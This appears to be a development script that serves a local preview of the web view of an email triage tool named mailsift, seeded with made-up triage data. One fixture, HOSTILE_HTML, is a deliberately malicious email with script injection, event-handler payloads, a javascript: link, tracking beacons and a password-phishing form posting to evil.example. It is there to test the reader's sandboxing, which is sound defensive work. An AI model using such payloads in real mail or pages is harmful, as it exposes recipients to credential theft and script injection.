#!/usr/bin/env node
/**
 * Serve the browser view over fixture data, for working on its design.
 *
 * No mailbox and no LLM are involved: a throwaway state database is seeded
 * with a week of plausible triage results, and the same routeWeb the service
 * uses answers on a local port. It reads nothing from data/ or .env and
 * writes only to the system temp directory.
 *
 * Run with: npx tsx scripts/web-preview.ts [--port 8499] [--token secret]
 *
 * The refresh button is wired to a pretend poll that files one more message,
 * a verification code, so that path can be exercised without IMAP. A digest
 * sent this morning is on record, and --failing leaves one mailbox failing to
 * sign in, so the status line and its mailbox sheet have something to say.
 *
 * Everything the page can do is stood in for, so it can all be tried: opening
 * a message reads a made-up body (one of them hostile, to see the reader hold),
 * actions move rows between pretend folders, "send" goes nowhere and says so
 * on the console, and the assistant answers from a script. --write-token is
 * the token that signs in with the right to act (default "write"); with
 * --token set, signing in with that one gives the read-only page. --arrive N
 * files a new message every N seconds, to watch the live line work.
 */
import { mkdtempSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import { setTimeout as sleep } from 'node:timers/promises';
import { parseArgs } from 'node:util';
import type { LiveMessage } from '../src/imap/client.js';
import type { AttachmentManifest } from '../src/imap/message.js';
import type { ReadableMessage } from '../src/imap/readable.js';
import { markDigestSent, type DigestItem } from '../src/services/digest.js';
import { StateStore, type MailRecord } from '../src/services/state.js';
import { HEARTBEAT_KEY, type PollStats } from '../src/services/watcher.js';
import { routeWeb, type WebBackend } from '../src/web.js';

// The config reader wants mailboxes before it answers. These are fixtures: the
// names feed the mailbox filter and the provider feeds the "open in" link, and
// the host is a closed local port, so the live reads the page offers (full
// body, attachments, safety clues) fail at once instead of sending a login
// for a made-up address to a real provider.
process.env.MAIL_ACCOUNT_1 = 'qq|me@qq.com|fixture|127.0.0.1';
process.env.MAIL_ACCOUNT_1_PORT = '9';
process.env.MAIL_ACCOUNT_1_NAME = 'personal-qq';
process.env.MAIL_ACCOUNT_2 = 'gmail_pw|me@gmail.com|fixture|127.0.0.1';
process.env.MAIL_ACCOUNT_2_PORT = '9';
process.env.MAIL_ACCOUNT_2_NAME = 'work-gmail';
process.env.MAILSIFT_VERSION ??= '0.0.0-preview';

const { values } = parseArgs({
  options: {
    port: { type: 'string', default: '8499' },
    token: { type: 'string', default: '' },
    failing: { type: 'boolean', default: false },
    'write-token': { type: 'string', default: 'write' },
    arrive: { type: 'string', default: '0' },
  },
});
const port = Number(values.port);
const token = values.token ?? '';
const writeToken = values['write-token'] ?? '';

const QQ = { account: 'me@qq.com', accountLabel: 'personal-qq' };
const GMAIL = { account: 'me@gmail.com', accountLabel: 'work-gmail' };

interface Fixture {
  /** How long ago the message was filed, in minutes. */
  age: number;
  account: string;
  accountLabel: string;
  importance: 'critical' | 'warning' | 'info';
  pushed: boolean;
  subject: string;
  fields: MailRecord;
}

const pdf = (filename: string, sizeBytes: number): AttachmentManifest => ({
  items: [{ partId: '2', filename, contentType: 'application/pdf', sizeBytes, inline: false }],
  truncated: false,
});

const H = 60;
const D = 24 * H;

// Every name, place and number below is made up and points at no real person,
// city, bank or carrier, since these rows end up in the README screenshots.
// Deadlines count from today, so a screenshot never shows a week of overdue dates.
function fromToday(days: number): Date {
  const date = new Date();
  date.setDate(date.getDate() + days);
  return date;
}
const ymd = (days: number): string => {
  const d = fromToday(days);
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
};
const enDay = (days: number): string => fromToday(days).toLocaleDateString('en-GB', { day: 'numeric', month: 'long' });
const zhDay = (days: number): string => `${fromToday(days).getMonth() + 1} 月 ${fromToday(days).getDate()} 日`;

const FIXTURES: Fixture[] = [
  { age: 4, ...GMAIL, importance: 'warning', pushed: true, subject: '[GitHub] Your verification code',
    fields: { sender: 'noreply@github.com', senderName: 'GitHub', folder: 'INBOX', category: 'Security',
      summary: 'One-time code for signing in to GitHub.', reason: 'Verification code; time-sensitive.',
      decidedBy: 'rule', verificationCode: '482913' } },
  { age: 23, ...QQ, importance: 'critical', pushed: true, subject: '您的 Apple 账户在新设备上登录',
    fields: { sender: 'noreply@email.apple.com', senderName: 'Apple', folder: 'INBOX', category: 'Security',
      summary: '一台未识别的 iPhone 登录了你的 Apple 账户。如果不是你本人，请立即修改密码。',
      reason: '新设备登录提醒，存在账户被盗用的风险。', decidedBy: 'llm' } },
  { age: 1 * H + 10, ...GMAIL, importance: 'warning', pushed: true, subject: 'Invoice #4821 is due in 3 days',
    fields: { sender: 'billing@stripe.com', senderName: 'Stripe', folder: 'INBOX', category: 'Finance',
      summary: `Invoice #4821 for $240.00 is due on ${enDay(3)}. Pay from the dashboard or by bank transfer.`,
      reason: 'An unpaid invoice with a deadline this week.', deadline: ymd(3), decidedBy: 'llm',
      attachmentManifest: pdf('invoice-4821.pdf', 48_120) } },
  { age: 2 * H + 5, ...QQ, importance: 'info', pushed: false, subject: '您的包裹正在派送',
    fields: { sender: 'tracking@parcel.example', senderName: '包裹追踪', folder: 'INBOX', category: 'Delivery',
      summary: '你的包裹正在派送，预计今天 18:00 前送达。', reason: '物流进度通知，无需操作。',
      decidedBy: 'llm' } },
  { age: 3 * H, ...QQ, importance: 'info', pushed: false, subject: '最后机会：全场 5 折，今晚截止',
    fields: { sender: 'promo@shop-mail.example', senderName: '网上商城', folder: '垃圾邮件', inSpam: true,
      category: 'Marketing', summary: '促销邮件，全场五折活动今晚截止。', reason: '营销推广，与近期活动无关。',
      decidedBy: 'llm' } },
  { age: 3 * H + 30, ...GMAIL, importance: 'warning', pushed: true, subject: 'Re: PR #61 needs your review before the release',
    fields: { sender: 'notifications@github.com', senderName: 'Mia (GitHub)', folder: 'INBOX', category: 'Work',
      threadKey: '<thread-pr61@github.com>', summary: 'Mia asked for a second review on PR #61 before tomorrow’s release; two comments are still unresolved.',
      reason: 'A direct request with a date attached.', deadline: ymd(1), decidedBy: 'llm' } },
  { age: 5 * H, ...QQ, importance: 'info', pushed: false, subject: '周六聚餐？',
    fields: { sender: 'club@example.com', senderName: '读书会', folder: 'INBOX', category: 'Personal',
      summary: '读书会周六晚上聚餐，问你是否参加，地点待定。', reason: '社交邀约，需要回复。', decidedBy: 'llm' } },
  { age: 6 * H, ...GMAIL, importance: 'critical', pushed: true, subject: 'Your domain my-site.example expires in 3 days',
    fields: { sender: 'renewals@registrar.example', senderName: 'Registrar', folder: '[Gmail]/Spam', inSpam: true,
      category: 'System', summary: `The domain my-site.example expires on ${enDay(3)} and auto-renew is off. Renew now to avoid downtime.`,
      reason: 'A service you depend on lapses in days, and it landed in spam.', deadline: ymd(3), decidedBy: 'llm' } },
  { age: 8 * H, ...QQ, importance: 'info', pushed: false, subject: '预约的图书已到馆',
    fields: { sender: 'noreply@library.example', senderName: '图书馆', folder: 'INBOX', category: 'Personal',
      summary: `你预约的图书已到馆，请在 ${zhDay(2)}前到服务台取书，逾期自动取消。`, reason: '有取书期限，两天后到期。',
      deadline: ymd(2), decidedBy: 'llm' } },
  { age: 10 * H, ...GMAIL, importance: 'warning', pushed: true, subject: 'Gate change for flight XY 123',
    fields: { sender: 'no-reply@airline.example', senderName: 'Airline', folder: 'INBOX', category: 'Travel',
      summary: `Flight XY 123 on ${enDay(1)} now boards at gate 27. Boarding closes 20 minutes before departure.`,
      reason: 'A change to travel that is already booked.', deadline: ymd(1), decidedBy: 'llm',
      attachmentManifest: pdf('boarding-pass.pdf', 212_400) } },
  { age: 12 * H, ...GMAIL, importance: 'info', pushed: false, subject: 'Sam mentioned you in a post',
    fields: { sender: 'notify@social.example', senderName: 'Social', folder: 'INBOX', category: 'Social',
      summary: 'Sam mentioned you in a post about the conference.', reason: 'Social notification.', decidedBy: 'fallback' } },
  { age: 1 * D + 2 * H, ...QQ, importance: 'info', pushed: false, subject: '信用卡电子账单',
    fields: { sender: 'statement@bank.example', senderName: '信用卡中心', folder: 'INBOX', category: 'Finance',
      summary: `本期账单已出，应还金额 ¥3,482.60，最后还款日 ${zhDay(10)}。`, reason: '例行账单，还款日尚远。',
      deadline: ymd(10), decidedBy: 'llm', attachmentManifest: pdf('statement.pdf', 96_300) } },
  { age: 1 * D + 4 * H, ...GMAIL, importance: 'warning', pushed: true, subject: 'Your password was changed',
    fields: { sender: 'security@accounts.example', senderName: 'Accounts', folder: 'INBOX', category: 'Security',
      summary: 'The password for your account was changed from a new Mac. If this was not you, reset it now.',
      reason: 'Account security change.', decidedBy: 'llm' } },
  { age: 1 * D + 6 * H, ...GMAIL, importance: 'info', pushed: false, subject: 'Weekly standup notes',
    fields: { sender: 'notes@team.example', senderName: 'Team notes', folder: 'INBOX', category: 'Work',
      summary: 'Notes from this week’s standup: release on Tuesday, on-call rotation unchanged.',
      reason: 'Informational team update.', decidedBy: 'llm' } },
  { age: 1 * D + 7 * H, ...QQ, importance: 'info', pushed: false, subject: '[广告] 年末大促提前购，领券立减',
    fields: { sender: 'edm@mall.example', senderName: '网上商城', folder: '垃圾邮件', inSpam: true, category: 'Marketing',
      summary: '年末促销预热。', reason: '营销邮件。', decidedBy: 'fallback' } },
  { age: 1 * D + 9 * H, ...GMAIL, importance: 'warning', pushed: true, subject: 'Signature requested: Consulting agreement',
    fields: { sender: 'dse@docusign.example', senderName: 'DocuSign', folder: 'INBOX', category: 'Legal',
      summary: `Acme Ltd asks you to sign the consulting agreement by ${enDay(5)}.`,
      reason: 'A document waiting on your signature with a date.', deadline: ymd(5), decidedBy: 'llm' } },
  { age: 1 * D + 11 * H, ...QQ, importance: 'info', pushed: false, subject: '您的包裹已签收',
    fields: { sender: 'tracking@parcel.example', senderName: '包裹追踪', folder: 'INBOX', category: 'Delivery',
      summary: '你的包裹已签收。', reason: '物流完成通知。', decidedBy: 'llm' } },
  { age: 1 * D + 12 * H, ...GMAIL, importance: 'info', pushed: false, subject: 'Nightly backup completed',
    fields: { sender: 'backup@infra.example', senderName: 'Backup', folder: 'INBOX', category: 'System',
      summary: 'The nightly backup finished in 14 minutes; 2.1 GB written.', reason: 'Routine success report.',
      decidedBy: 'rule' } },
  { age: 2 * D + 3 * H, ...GMAIL, importance: 'critical', pushed: true, subject: 'Payment failed for your subscription',
    fields: { sender: 'billing@cloud.example', senderName: 'Cloud', folder: 'INBOX', category: 'Finance',
      summary: `The card ending 4242 was declined. Services are suspended if payment fails again on ${enDay(2)}.`,
      reason: 'Failed payment with service interruption ahead.', deadline: ymd(2), decidedBy: 'llm' } },
  { age: 2 * D + 5 * H, ...GMAIL, importance: 'warning', pushed: true, subject: 'Re: PR #61 needs your review before the release',
    fields: { sender: 'notifications@github.com', senderName: 'Mia (GitHub)', folder: 'INBOX', category: 'Work',
      threadKey: '<thread-pr61@github.com>', summary: 'Mia opened PR #61 and asked for review.',
      reason: 'Review request.', decidedBy: 'llm' } },
  { age: 2 * D + 8 * H, ...QQ, importance: 'info', pushed: false, subject: '电影票购票成功',
    fields: { sender: 'tickets@cinema.example', senderName: '影院购票', folder: 'INBOX', category: 'Personal',
      summary: `${zhDay(4)} 19:30 场次购票成功，3 号厅 7 排 8 座，开场前 15 分钟检票。`, reason: '购票确认。',
      decidedBy: 'llm' } },
  { age: 3 * D + 2 * H, ...QQ, importance: 'info', pushed: false, subject: 'Fwd: 下周团建安排',
    fields: { sender: 'me@gmail.com', senderName: 'me', folder: 'INBOX', category: 'Forwarded copy',
      summary: '从另一个受监控邮箱转发的副本。', reason: '发件人是已配置的邮箱之一。', decidedBy: 'rule' } },
  { age: 3 * D + 9 * H, ...GMAIL, importance: 'warning', pushed: true, subject: 'mailsift: personal-qq failed 3 polls in a row',
    fields: { sender: 'mailsift', senderName: 'mailsift', folder: '', category: 'Service failure',
      summary: 'IMAP login to imap.qq.com was refused three times; check the app password.',
      reason: 'Health alert from the poller.', decidedBy: 'health' } },
  { age: 4 * D + 4 * H, ...GMAIL, importance: 'info', pushed: false, subject: 'Your monthly usage report',
    fields: { sender: 'reports@analytics.example', senderName: 'Analytics', folder: 'INBOX', category: 'Work',
      summary: 'Monthly usage report: 12,400 requests, 99.98% availability.', reason: 'Routine report.', decidedBy: 'llm' } },
  { age: 5 * D + 6 * H, ...QQ, importance: 'warning', pushed: true, subject: '账户余额不足提醒',
    fields: { sender: 'notice@hosting.example', senderName: '主机服务商', folder: 'INBOX', category: 'Finance',
      summary: '账户余额低于 ¥100，部分按量付费服务可能在 3 天后停机。', reason: '余额不足会影响在线服务。',
      deadline: ymd(-2), decidedBy: 'llm' } },
  { age: 6 * D + 1 * H, ...GMAIL, importance: 'info', pushed: false, subject: 'Welcome to the newsletter',
    fields: { sender: 'hello@newsletter.example', senderName: 'Newsletter', folder: '[Gmail]/Spam', inSpam: true,
      category: 'Marketing', summary: 'A welcome message from a newsletter you did not sign up for.',
      reason: 'Bulk mail.', decidedBy: 'fallback' } },
];

const DIGEST: DigestItem[] = [
  { accountLabel: 'personal-qq', folder: 'INBOX', inSpam: false, subject: '您的包裹正在派送', from: 'tracking@parcel.example',
    fromName: '包裹追踪', importance: 'info', category: 'Delivery', summary: '你的包裹正在派送。', deadline: '',
    actionRequired: false, threadCount: 1, date: new Date(Date.now() - (2 * H + 5) * 60_000).toISOString() },
  { accountLabel: 'personal-qq', folder: 'INBOX', inSpam: false, subject: '周六聚餐？', from: 'club@example.com',
    fromName: '读书会', importance: 'info', category: 'Personal', summary: '读书会周六晚上聚餐，问你是否参加。', deadline: '',
    actionRequired: true, threadCount: 1, date: new Date(Date.now() - 5 * H * 60_000).toISOString() },
  { accountLabel: 'work-gmail', folder: 'INBOX', inSpam: false, subject: 'Sam mentioned you in a post', from: 'notify@social.example',
    fromName: 'Social', importance: 'info', category: 'Social', summary: 'Sam mentioned you in a post about the conference.',
    deadline: '', actionRequired: false, threadCount: 1, date: new Date(Date.now() - 12 * H * 60_000).toISOString() },
  { accountLabel: 'personal-qq', folder: '垃圾邮件', inSpam: true, subject: '最后机会：全场 5 折，今晚截止', from: 'promo@shop-mail.example',
    fromName: '网上商城', importance: 'info', category: 'Marketing', summary: '促销邮件。', deadline: '',
    actionRequired: false, threadCount: 1, date: new Date(Date.now() - 3 * H * 60_000).toISOString() },
];

const dir = mkdtempSync(join(tmpdir(), 'mailsift-preview-'));
const dbPath = join(dir, 'preview.db');
// The live line opens its own handle on the configured database: point it here.
process.env.STATE_DB_PATH = dbPath;

function seed(): void {
  const store = new StateStore(dbPath);
  FIXTURES.forEach((fixture, index) => {
    const key = `preview-${String(index + 1).padStart(2, '0')}`;
    const at = new Date(Date.now() - fixture.age * 60_000).toISOString();
    store.markSeen(key, fixture.account, fixture.subject);
    store.recordOutcome(key, fixture.importance, fixture.pushed, {
      messageId: `<${key}@preview>`,
      accountLabel: fixture.accountLabel,
      mailDate: at,
      ...fixture.fields,
    });
  });
  DIGEST.forEach((item, index) => store.queueDigest(`preview-digest-${index}`, item));
  // This morning's digest, already sent, listing three of the fixtures.
  const sentAt = new Date();
  if (sentAt.getHours() < 9) sentAt.setDate(sentAt.getDate() - 1);
  sentAt.setHours(9, 0, 0, 0);
  store.recordDigestLog(sentAt.toISOString(), [12, 14, 17].map((n) => {
    const fixture = FIXTURES[n - 1]!;
    return {
      dedupKey: `preview-${String(n).padStart(2, '0')}`,
      payload: {
        accountLabel: fixture.accountLabel, folder: fixture.fields.folder ?? 'INBOX', inSpam: Boolean(fixture.fields.inSpam),
        subject: fixture.subject, from: fixture.fields.sender ?? '', fromName: fixture.fields.senderName ?? '',
        importance: fixture.importance, category: fixture.fields.category ?? 'Other', summary: fixture.fields.summary ?? '',
        deadline: fixture.fields.deadline ?? '', actionRequired: false, threadCount: 1, date: sentAt.toISOString(),
      },
    };
  }));
  // ...and marked sent, as sendDigest would, so "Next digest" points past it.
  markDigestSent(store, sentAt);
  if (values.failing) {
    store.setMeta('account_fail_count:me@gmail.com', '3');
    store.setMeta('account_last_error:me@gmail.com', 'Error: Authentication failed');
    store.setMeta('account_last_failure:me@gmail.com', new Date().toISOString());
    store.setMeta('account_last_success:me@gmail.com', new Date(Date.now() - 26 * 3_600_000).toISOString());
  }
  // A poll finished a few minutes ago, so the status line has something to say.
  store.setMeta(HEARTBEAT_KEY, new Date(Date.now() - 3 * 60_000).toISOString());
  // The queue starts when the release that has it first opens the database;
  // these rows are backdated, so move that moment back before them.
  store.setMeta('attention_since', new Date(Date.now() - 30 * D * 60_000).toISOString());
  store.close();

  // markSeen stamps "now"; move each row back to when it is meant to have arrived.
  const db = new DatabaseSync(dbPath);
  const backdate = db.prepare('UPDATE seen SET created_at = ? WHERE dedup_key = ?');
  FIXTURES.forEach((fixture, index) => {
    const key = `preview-${String(index + 1).padStart(2, '0')}`;
    backdate.run(new Date(Date.now() - fixture.age * 60_000).toISOString(), key);
  });
  // Two were dealt with lately: one from yesterday, and one from last week
  // that the day's list no longer shows, so the way back to it can be tried.
  const dealtWith = db.prepare('UPDATE seen SET handled_at = ? WHERE dedup_key = ?');
  dealtWith.run(new Date(Date.now() - 2 * H * 60_000).toISOString(), 'preview-13');
  dealtWith.run(new Date(Date.now() - 1 * D * 60_000).toISOString(), 'preview-25');
  db.close();
}

seed();
const store = new StateStore(dbPath);

let refreshes = 0;
/** The pretend poll: one new verification code each time, after a believable pause. */
async function pretendPoll(): Promise<PollStats> {
  await sleep(1200);
  refreshes += 1;
  const key = `preview-refresh-${refreshes}`;
  const code = String(100_000 + ((refreshes * 7919) % 900_000));
  store.markSeen(key, GMAIL.account, 'Your Cursor sign-in code');
  store.recordOutcome(key, 'warning', true, {
    messageId: `<${key}@preview>`, accountLabel: GMAIL.accountLabel, sender: 'no-reply@cursor.sh', senderName: 'Cursor',
    folder: 'INBOX', category: 'Security', summary: 'One-time sign-in code for Cursor.',
    reason: 'Verification code; time-sensitive.', decidedBy: 'rule', verificationCode: code,
    mailDate: new Date().toISOString(),
  });
  // A real poll ends by writing the heartbeat; the status line reads it.
  store.setMeta(HEARTBEAT_KEY, new Date().toISOString());
  return { accountsOk: 2, accountsFailed: 0, fetched: 1, fresh: 1, pushed: 1, queued: 0, spamRescued: 0, failures: [] };
}

// ---- Stand-ins for the mailbox, the mail server and the model ----

const address = (name: string, mail: string): { name: string; address: string } => ({ name, address: mail });

function readable(partial: Partial<ReadableMessage>): ReadableMessage {
  return {
    html: null, htmlOmitted: false, text: '', quoted: '', truncated: false, from: null, to: [], cc: [], replyTo: [],
    subject: '', date: new Date().toISOString(), messageId: null, inReplyTo: null, references: [],
    auth: { result: 'none', dkim: null, spf: null, dmarc: null, signedBy: null }, unsubscribe: null, inlineImages: 0,
    ...partial,
  };
}

const PIXEL = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';

/** A designed message, the way billing mail looks: tables, colour, a logo, a button. */
const INVOICE_HTML = `<html><head><style>
  .wrap{background:#f6f9fc;padding:24px 0;font-family:Helvetica,Arial,sans-serif}
  .card{background:#ffffff;border-radius:8px;width:560px;margin:0 auto}
  .btn{background:#635bff;color:#ffffff;text-decoration:none;padding:12px 20px;border-radius:6px;display:inline-block;font-weight:bold}
  @media (max-width:600px){.card{width:100%!important}}
</style></head><body><div class="wrap"><table class="card" cellpadding="0" cellspacing="0" width="560" align="center">
<tr><td style="padding:28px 32px 8px"><img src="https://images.example/stripe-logo.png" width="80" height="34" alt="Stripe"></td></tr>
<tr><td style="padding:8px 32px;color:#32325d;font-size:22px;font-weight:bold">Invoice #4821 is due in 3 days</td></tr>
<tr><td style="padding:8px 32px;color:#525f7f;font-size:15px;line-height:24px">Hi there,<br>This is a reminder that invoice <b>#4821</b> for <b>$240.00</b> is due soon. You can pay it from the dashboard or by bank transfer.</td></tr>
<tr><td style="padding:16px 32px"><table width="100%" cellpadding="8" style="border-top:1px solid #e6ebf1;border-bottom:1px solid #e6ebf1;color:#525f7f;font-size:14px">
<tr><td>Consulting, October</td><td align="right">$200.00</td></tr><tr><td>Tax</td><td align="right">$40.00</td></tr>
<tr><td style="color:#32325d;font-weight:bold">Amount due</td><td align="right" style="color:#32325d;font-weight:bold">$240.00</td></tr></table></td></tr>
<tr><td style="padding:8px 32px 28px"><a class="btn" href="https://dashboard.stripe.com/invoices/in_4821">Pay invoice</a></td></tr>
<tr><td style="padding:0 32px 28px;color:#8898aa;font-size:12px">Questions? Visit <a href="https://support.stripe.com/">support.stripe.com</a>.
<img src="https://track.mailer.example/open?id=abc" width="1" height="1" alt=""></td></tr>
</table></div></body></html>`;

/** Everything a message should not be able to do, in one message. */
const HOSTILE_HTML = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/">
<script>document.title='pwned';parent.document.body.dataset.pwned='script'</script>
<link rel="stylesheet" href="https://evil.example/x.css"><base href="https://evil.example/"></head>
<body onload="parent.document.body.dataset.pwned='onload'">
<h2>Your domain my-site.example expires in 3 days</h2>
<p>Auto-renew is off. Renew now to avoid downtime: <a href="https://registrar-renewals.evil.example/login">https://registrar.example/renew</a></p>
<p><a href="javascript:parent.document.body.dataset.pwned='href'">Renew with one click</a></p>
<img src="x" onerror="parent.document.body.dataset.pwned='onerror'">
<img src="https://evil.example/beacon.gif" width="1" height="1">
<img src="https://evil.example/banner.png" width="300" height="60" alt="banner">
<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button>Sign in</button></form>
<iframe src="https://evil.example/frame"></iframe>
<svg onload="parent.document.body.dataset.pwned='svg'"><script>parent.document.body.dataset.pwned='svgscript'</script></svg>
<div style="position:fixed;inset:0;background:url(https://evil.example/bg.png)">This layer tries to cover the page.</div>
<p style="color:#444">Thank you,<br>Registrar</p>
</body></html>`;

function liveFixture(messageId: string): LiveMessage | undefined {
  const row = store.getMail(messageId);
  if (!row) return undefined;
  const from = address(row.senderName ?? '', row.sender ?? '');
  const base = {
    from, to: [address('', row.account)], subject: row.subject ?? '', date: row.mailDate ?? row.createdAt,
    messageId: row.messageId, references: [],
  };
  const flags = { seen: false, flagged: false, answered: false };
  const folder = row.folder ?? 'INBOX';
  const subject = row.subject ?? '';
  if (subject.startsWith('Invoice #4821')) {
    return { folder, flags, readable: readable({
      ...base, html: INVOICE_HTML,
      text: 'Hi there,\n\nThis is a reminder that invoice #4821 for $240.00 is due soon. You can pay it from the dashboard or by bank transfer.\n\nConsulting, October  $200.00\nTax  $40.00\nAmount due  $240.00\n\nPay invoice: https://dashboard.stripe.com/invoices/in_4821',
      auth: { result: 'pass', dkim: 'pass', spf: 'pass', dmarc: 'pass', signedBy: 'stripe.com' },
      unsubscribe: 'https://stripe.com/unsubscribe?u=preview',
    }) };
  }
  if (subject.startsWith('Your domain')) {
    return { folder, flags, readable: readable({
      ...base, html: HOSTILE_HTML,
      text: 'Your domain my-site.example expires in 3 days. Auto-renew is off. Renew now: https://registrar.example/renew',
      auth: { result: 'fail', dkim: 'fail', spf: 'softfail', dmarc: 'fail', signedBy: null },
      replyTo: [address('', 'billing@other-domain.example')],
    }) };
  }
  if (subject === '周六聚餐？') {
    return { folder, flags, readable: readable({
      ...base, cc: [address('小周', 'zhou@example.com'), address('阿林', 'lin@example.com')],
      text: '大家好，\n\n这周六晚上读书会想一起吃个饭，顺便聊聊下个月的书单。地点还没定，倾向于上次那家云南菜，或者大家有更好的推荐也可以提。\n\n能来的话回复一下，我周四前订位。详情见 https://club.example.com/dinner\n\n读书会',
      quoted: '在 2026年11月10日 21:14，小周 <zhou@example.com> 写道：\n> 上次那家不错，就是有点吵。\n> 我周六可以。',
      auth: { result: 'pass', dkim: 'pass', spf: 'pass', dmarc: 'pass', signedBy: 'example.com' },
    }) };
  }
  if (subject.startsWith('Re: PR #61')) {
    return { folder, flags, readable: readable({
      ...base, references: ['<thread-pr61@github.com>'],
      html: `<div dir="ltr"><p><b>@mia</b> requested your review on <a href="https://github.com/acme/app/pull/61">acme/app#61</a>.</p><p>Two comments are still unresolved, and the release goes out tomorrow. Could you take a look before then?</p><blockquote>Fix the retry loop in the uploader and add a test for the timeout path.</blockquote><p style="font-size:12px">You are receiving this because your review was requested.<br><img src="${PIXEL}" width="16" height="16" alt="GitHub"> GitHub</p></div>`,
      text: '@mia requested your review on acme/app#61.\n\nTwo comments are still unresolved, and the release goes out tomorrow. Could you take a look before then?',
      auth: { result: 'pass', dkim: 'pass', spf: 'pass', dmarc: 'pass', signedBy: 'github.com' },
    }) };
  }
  // Everything else: a short plain message made from what triage stored.
  const summary = row.summary ?? '';
  return { folder, flags, readable: readable({
    ...base, text: `${summary}\n\n${row.reason ?? ''}`.trim(),
    html: row.verificationCode ? null : `<div><p>${summary.replace(/[<>&]/g, '')}</p><p>${(row.reason ?? '').replace(/[<>&]/g, '')}</p></div>`,
  }) };
}

const backend: Partial<WebBackend> = {
  read: async (_account, messageId) => { await sleep(350); return liveFixture(messageId); },
  act: async (account, messageId, action) => {
    await sleep(300);
    const row = store.getMail(messageId);
    const sourceFolder = row?.folder ?? 'INBOX';
    const destination = action === 'archive' ? 'Archive' : action === 'trash' ? 'Trash' : action === 'inbox' ? 'INBOX' : undefined;
    return {
      action, account: account.username, messageId, sourceFolder,
      ...(destination ? { destinationFolder: destination, destinationIsSpam: false } : {}),
    };
  },
  send: async (account, mail) => {
    await sleep(700);
    console.log(`[preview] pretended to send from ${account.username} to ${mail.to.join(', ')}: ${mail.subject}`);
    const raw = Buffer.from(mail.text);
    return { messageId: `<sent-${Date.now()}@preview>`, raw, copy: raw, accepted: mail.to, rejected: [] };
  },
  appendSent: async () => 'Sent',
  savesSentCopy: () => true,
  sending: () => ({ available: true }),
  assistant: () => true,
  ask: async (asked, question, options) => {
    await sleep(900);
    const zh = /[一-鿿]/.test(question) || options.lang === 'zh-CN';
    const rows = asked.attention(3);
    if (!rows.length) return { answer: zh ? '最近没有需要你处理的邮件。' : 'Nothing in the recent mail needs you.', citations: [], considered: 12 };
    const cite = rows.map((_, n) => `[${n + 1}]`).join('');
    return {
      answer: zh
        ? `目前最要紧的有 ${rows.length} 件：${rows.map((r, n) => `${r.senderName ?? r.sender} 的「${r.subject}」[${n + 1}]`).join('，')}。其余的都可以等一等。`
        : `${rows.length} things matter most right now: ${rows.map((r, n) => `${r.senderName ?? r.sender} on "${r.subject}" [${n + 1}]`).join('; ')}. The rest can wait ${cite ? '' : ''}.`.replace(' .', '.'),
      citations: rows.map((r, n) => ({ n: n + 1, key: r.dedupKey })),
      considered: 26,
    };
  },
  draft: async (input) => {
    await sleep(800);
    const zh = /[一-鿿]/.test(`${input.text}${input.instruction ?? ''}`);
    const said = (input.instruction ?? '').trim();
    return { draft: zh
      ? `你好，\n\n谢谢来信。${said ? `关于这件事：${said}。` : '我看过了，这周内给你答复。'}\n\n如果还有需要我提前准备的，请告诉我。\n\n祝好`
      : `Hi,\n\nThanks for the note. ${said ? `On this: ${said}.` : 'I have read it and will get back to you this week.'}\n\nLet me know if you need anything from me before then.\n\nBest regards` };
  },
  testPush: async () => 'sent',
};

// --arrive N: a new message every N seconds, to watch the live line bring it in.
const arriveEvery = Number(values.arrive);
if (Number.isFinite(arriveEvery) && arriveEvery > 0) {
  let n = 0;
  setInterval(() => {
    n += 1;
    const key = `preview-arrive-${n}`;
    const critical = n % 3 === 0;
    store.markSeen(key, GMAIL.account, `Build ${1200 + n} ${critical ? 'failed on main' : 'passed'}`);
    store.recordOutcome(key, critical ? 'critical' : 'info', critical, {
      messageId: `<${key}@preview>`, accountLabel: GMAIL.accountLabel, sender: 'ci@builds.example', senderName: 'CI',
      folder: 'INBOX', category: 'Work', decidedBy: 'llm', mailDate: new Date().toISOString(),
      summary: critical ? `Build ${1200 + n} failed on main: 3 tests are red.` : `Build ${1200 + n} passed on main.`,
      reason: critical ? 'The main branch is broken.' : 'Routine success report.',
    });
  }, arriveEvery * 1000).unref();
}

const server = createServer((req, res) => {
  void (async () => {
    try {
      const url = new URL(req.url ?? '/', `http://127.0.0.1:${port}`);
      const answer = await routeWeb(req, url, token, store, 'preview', { onRefresh: pretendPoll, writeToken, backend });
      const headers: Record<string, string> = { 'content-type': answer.contentType };
      if (answer.cookie) headers['set-cookie'] = answer.cookie;
      if (answer.cacheControl) headers['cache-control'] = answer.cacheControl;
      Object.assign(headers, answer.headers);
      if (answer.status === 303) headers['location'] = '/';
      if (answer.stream) {
        res.writeHead(answer.status, headers);
        res.flushHeaders();
        answer.stream({
          write: (chunk) => {
            if (res.writableEnded || res.destroyed) throw new Error('stream closed');
            res.write(chunk);
          },
          onClose: (listener) => { res.once('close', listener); },
          close: () => { if (!res.writableEnded) res.end(); },
        });
        return;
      }
      res.writeHead(answer.status, headers).end(answer.body);
    } catch (error) {
      console.error('preview request failed:', error);
      if (!res.headersSent) res.writeHead(500).end();
    }
  })();
});

server.listen(port, '127.0.0.1', () => {
  console.log(`mailsift web preview: http://127.0.0.1:${port}/` + (token ? ` (token: ${token})` : '')
    + (writeToken ? `\nsign in at /signin with "${writeToken}" to act on mail` : '') + `\nfixtures: ${dbPath}`);
});
